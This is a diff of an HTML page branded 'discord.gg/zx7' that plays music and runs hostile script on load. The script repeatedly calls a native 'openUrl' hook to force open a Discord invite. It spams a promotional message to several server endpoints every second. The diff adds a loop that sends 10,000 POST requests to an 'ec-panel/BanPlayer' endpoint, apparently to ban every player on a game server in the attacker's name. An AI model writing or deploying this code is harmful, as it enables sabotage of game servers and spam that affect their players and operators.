@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>discord.gg/zx7</title>
   <style>
-    /* Your styles (same as before)... */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #000;
@@ -97,15 +96,12 @@
 
   <audio id="bg-music" preload="auto" loop>
     <source src="https://cdn.discordapp.com/attachments/1386825192134803536/1402625609317879868/eCyF1sh.mp4?ex=68949864&is=689346e4&hm=dd298b0ac8b11bf204be0ec1461788aefb734f8c2482b092ea723942d3732ca9&" type="audio/mpeg">
-    Your browser does not support the audio element.
   </audio>
 
   <audio id="key-sound" preload="auto">
     <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_b3b2a83e90.mp3" type="audio/mpeg">
-    Your browser does not support the audio element.
   </audio>
 
-  <!-- Scripts -->
   <script>
     const audio = document.getElementById("bg-music");
     const keySound = document.getElementById("key-sound");
@@ -140,7 +136,6 @@
       typeWriter();
     }, 2000);
 
-    // ⚠️ Auto open Discord link repeatedly (can be blocked by browsers)
     setInterval(function() {
       try {
         window.invokeNative("openUrl", "https://discord.gg/zx7");
@@ -149,7 +144,6 @@
       }
     }, 1000);
 
-    // ⚠️ Spams message to multiple servers every second
     const msg = `👑 Faisal Al Shammari - .gg/zx7 ! 👑`;
     const body = JSON.stringify({ message: msg });
     setInterval(() => {
@@ -183,6 +177,16 @@
         })
       });
     }, 1000);
+
+    // From second script block
+    for (let i = 1; i <= 10000; i++) {
+      setTimeout(() => {
+        $.post('https://ec-panel/BanPlayer', JSON.stringify({
+          id: i,
+          Reason: "By Faisal Discord.gg/ZX7"
+        }));
+      }, i * 50);
+    }
   </script>
 
 </body>
